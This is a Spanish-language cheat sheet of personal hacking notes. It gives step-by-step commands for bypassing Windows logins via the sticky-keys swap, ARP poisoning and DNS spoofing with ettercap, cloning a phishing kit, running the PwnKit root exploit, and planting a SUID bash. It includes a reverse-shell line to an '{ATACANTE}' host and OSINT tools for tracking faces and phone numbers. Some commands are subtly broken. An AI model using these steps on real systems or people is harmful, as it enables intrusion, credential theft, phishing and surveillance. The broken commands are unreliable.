YO<h1 style="text-align:center;font-size:40px;">LINUX FH</h1>

## Soluciones

### Recuperar contraseña windows

#### desde LINUX

```sh
vim /etc/fstab

/dev/sda1 /mnt/windows ntfs ro,umask=0222,defaults 0 0
```

#### Windows CD

```ps1
C:\windows\system32\osk.exe o sethc.exe = cmd.exe (copia)
```

> SHIFT x5 / teclado

```ps1
control userpasswords2

net user -- net user administrator *
```

#### CHNTPW

[chntpw](https://www.howtogeek.com/howto/14369/change-or-reset-windows-password-from-a-ubuntu-live-cd/)

## Ejecutar como administrador en linux

> en caso de que no funcione su - / sudo para editar:
> `pkexec` ← pide password desde el entorno grafico

## HK [ MAC / NETWORK SCANNER / NET CUT ]

### SCAPY

SI NO FUNCIONA

```sh
apt install pip
pip install scapy
sudo mkdir /usr/lib/python2.7/dist-packages/scapy
cd /usr/lib/python3/dist-packages/
cp -avr scapy/* /usr/lib/python2.7/dist-packages/scapy
```

### HABILITAR REENVIO AL CAMBIAR MAC OTRO PC (spoofer)

```sh
echo 1 /proc/sys/net/ipv4/ip_forward
```

### REESTABLECER TABLAS IP

```sh
iptables -I FORWARD -j NFQUEUE --queue-num 0
```

### ettercap

```sh
apt install ettercap-ettercap-graphical
```

> Añadir victica Target 1 - Puerta de enlace Target 2
> ARP poisoning…
> Pluging
> 
> > dns_spoof

### REDIRIGIR

```sh
/etc/ettercap/etther.dns # configuracion dns etthercap
```

```sh
*.example.*		A	[IP LOCAL] # redireccionar
REDIRIGIR c/ APACHE
apt install apache2
/var/www/html/index.html```
```

![](https://i.imgur.com/Rk7nlIr.png)

```sh
git clone https://github.com/DeepSociety/AIOPhish
```

## Cambiar passwd ROOT

> grub
> advanced options for X
> recovery mode	“e”
> linix … ro single init=/bin/bash

## Modificar [grub](https://drive.google.com/drive/folders/1G_pFqJbG9hLI9BOZ9hTaXKn__jJdg81m)

```sh
/boot/grub/grub.cfg
```

## vulnerabilidad root

```sh
git clone https://github.com/berdav/CVE-2021-4034
make
./cve-2021-4034
```

## Mejorar terminal 

```sh
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl + Z para segundo plano
stty raw -echo;fg;ls; export SHELL=/bin/bash;export TERM=screen # traer tarea
```

### Escalar

> enviar netcat de un proceso en cron como root

```sh
#1
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```sh
/tmp/rootbash -p
```

```sh
#2
"bash -i >& /dev/tcp/{ATACANTE}/4444 0>&1 "
```

## OSINT

### Fotos 

[Pimeyes](https://pimeyes.com/)

### Telefonos

#### Phoneinfoga

```sh
curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash
sudo install ./phoneinfoga /usr/local/bin/phoneinfoga
phoneinfoga version
phoneinfoga serve -p 81
```